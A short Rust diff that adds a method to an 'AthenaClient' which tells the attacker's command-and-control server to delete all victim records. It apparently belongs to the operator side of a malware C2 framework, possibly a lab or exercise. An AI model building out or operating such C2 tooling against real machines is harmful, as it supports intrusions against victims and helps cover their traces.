@@ -132,6 +132,18 @@ impl AthenaClient {
         }
     }
 
+    /// Attacker: Delete all victims from C2 server
+    pub async fn attack_delete_all_victims(&self) -> AthenaResult<()> {
+        let url = self.host.clone().join(V1_ROUTES.attack.delete_victims)?;
+        let resp = self.client.post(url).send().await?;
+        if resp.status() == StatusCode::OK {
+            Ok(())
+        } else {
+            let err: ErrorToResponse = resp.json().await.unwrap();
+            Err(Box::new(err))
+        }
+    }
+
     /// Attacker: Get configured password of the C2 server
     pub fn get_password(&self) -> &str {
         &self.password.password
